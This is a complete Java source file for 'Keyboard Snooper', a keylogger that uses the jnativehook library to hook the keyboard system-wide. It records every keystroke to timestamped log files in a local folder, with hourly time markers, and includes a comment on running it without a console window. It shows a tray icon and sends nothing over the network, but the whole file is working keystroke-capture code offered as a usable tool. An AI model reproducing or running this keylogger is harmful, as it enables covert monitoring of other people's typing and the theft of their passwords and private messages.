import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyAdapter;

import java.util.logging.*;
import java.io.*;
import java.awt.*;
import java.awt.event.*;

//COMPILE: javac -cp ".;lib/jnativehook-2.1.0.jar;" Snooper.java
//RUN: java -cp ".;lib/jnativehook-2.1.0.jar;" Snooper
//RUN without console: javaw -cp ".;lib/jnativehook-2.1.0.jar;" Snooper
public class Snooper extends NativeKeyAdapter {
  
	public static final String FOLDER = "snoop_log";
	public static final String DASH = "/";
	public static final String START_NAME = "log_";
	public static final String EXTENSION_NAME = ".slog";
	public static final int SECOND_IN_MILLI = 1_000;
	public static final int HOUR_IN_MILLI = SECOND_IN_MILLI * 60 * 60;
	public static final String fileNameFormat = "yyyyMMddHHmmssSSSS";
	public static final String perHourFormat = "yyyy, MM dd, h:mma";
	public static final String TITLE = "Keyboard Snooper";
	public static final String AUTHOR = "doppelgunner";

	private File folderFile;
	private File keyStrokesFile;
	private File tempFile;
	private String keyStrokesFilePath;
	private String tempFilePath;
	
	private String startDate;
	
	private javax.swing.Timer flushTimer;
	private javax.swing.Timer perHourTimer;
	
	private BufferedWriter bWriter;
	
	private boolean wroteSomething;
	
	private TrayIcon trayIcon;
	private SystemTray tray;
	private PopupMenu popup;
	
	public Snooper() {
		init();
		initSystemTray();
		start();
	}
	
	//init of the base of the program
	public void init() {
		folderFile = new File(FOLDER);
		startDate = Util.getCurrentDate(fileNameFormat);
		keyStrokesFilePath = FOLDER + DASH + START_NAME + startDate + EXTENSION_NAME;
		keyStrokesFile = new File(keyStrokesFilePath);
		tempFilePath = FOLDER + DASH + START_NAME + "temp" + EXTENSION_NAME;
		
		if (Util.hasInstance(tempFilePath)) {
			System.exit(0); //exit app if already has a temp file to log into
		}
		
		tempFile = Util.createFile(tempFilePath);
		
		try {
			bWriter = new BufferedWriter(new FileWriter(tempFile));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		Runtime.getRuntime().addShutdownHook(new Thread(()-> {
			dispose();
		}));
		
		flushTimer = new javax.swing.Timer(SECOND_IN_MILLI, e-> {
			try {
				if (wroteSomething) {
					wroteSomething = false;
					bWriter.flush();
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
		
		perHourTimer = new javax.swing.Timer(HOUR_IN_MILLI, e-> {
			try {
				String hourlyUpdateString = "Hourly update as of: " + Util.getCurrentDate(perHourFormat);
				bWriter.write(hourlyUpdateString);
				bWriter.newLine();
				bWriter.flush(); 
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
	}
	
	//init of system tray
	public void initSystemTray() {
		if (!SystemTray.isSupported()) {
			System.err.println("System tray is not supported");
		}
		tray = SystemTray.getSystemTray();
		trayIcon = new TrayIcon(Util.createImage("images/snooper.png","Keyboard Snooper"));
		try {
			tray.add(trayIcon);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		popup = new PopupMenu();
		MenuItem about = new MenuItem("About");
		MenuItem exit = new MenuItem("Exit");
		
		popup.add(about);
		popup.addSeparator();
		popup.add(exit);
		
		trayIcon.setImageAutoSize(true);
		trayIcon.setToolTip("Keyboard Snooper");
		trayIcon.setPopupMenu(popup);
		
		about.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				trayIcon.displayMessage(TITLE, "by " + AUTHOR, TrayIcon.MessageType.NONE);
			}
		});
		
		exit.addActionListener(e -> {
			trayIcon.displayMessage(TITLE, "Exiting ...", TrayIcon.MessageType.NONE);
			tray.remove(trayIcon);
			System.exit(0);
		});
	}
	
	//starts the timer of the program
	public void start() {
		//start the timers
		flushTimer.start();
		perHourTimer.setInitialDelay(0);
		perHourTimer.start();
		
		trayIcon.displayMessage(TITLE, "Starting ...", TrayIcon.MessageType.NONE);
	}
	
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
			if (bWriter == null) return;
			bWriter.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
			bWriter.newLine();
			wroteSomething = true;
		} catch(Exception ex) {
			ex.printStackTrace();
		}
    }

    public static void main(String[] args) {
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Snooper());
    }
	
	//called when the program is aout to exit or shutdown
	public void dispose() {
		try {
			if (bWriter != null) {
				bWriter.close();
			}
			tempFile.renameTo(keyStrokesFile);
		} catch (Exception ex) {
			System.err.println("Error: closing stream");
		}
	}
}